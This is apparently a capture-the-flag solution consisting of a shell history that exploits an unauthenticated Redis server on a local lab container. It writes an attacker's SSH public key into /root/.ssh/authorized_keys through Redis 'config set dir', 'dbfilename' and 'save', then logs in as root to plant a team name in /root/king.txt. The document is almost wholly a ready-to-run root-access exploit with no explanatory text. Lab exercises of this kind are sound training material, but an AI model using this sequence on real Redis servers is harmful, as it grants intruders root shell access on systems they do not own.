Use the series orchestrator to run and debug this machine

solution:

```bash
  501  ssh-keygen -t rsa -b 2048 -f ./h1b_key -N ""
  502  (echo -e "\n\n"; cat h1b_key.pub; echo -e "\n\n") > payload.txt
  503  cat payload.txt | redis-cli -h 127.0.0.1 -p 10002 -x set crackit
  504  cat payload.txt
  505  redis-cli -h 127.0.0.1 -p 10002 config set dir /root/.ssh/
  506  redis-cli -h 127.0.0.1 -p 10002 config set dbfilename "authorized_keys"
  507  redis-cli -h 127.0.0.1 -p 10002 save
  508  ssh -i h1b_key root@127.0.0.1 -p 10003 -o StrictHostKeyChecking=no "echo Team_Izzup > /root/king.txt"
  509  docker exec koth_h1b cat /root/king.txt
  510  nmap -Pn -p 10002,10003 -sV 127.0.0.1
  511  redis-cli -h 127.0.0.1 -p 10002
  512  cat shell.php
  513  clear
  514  history
```
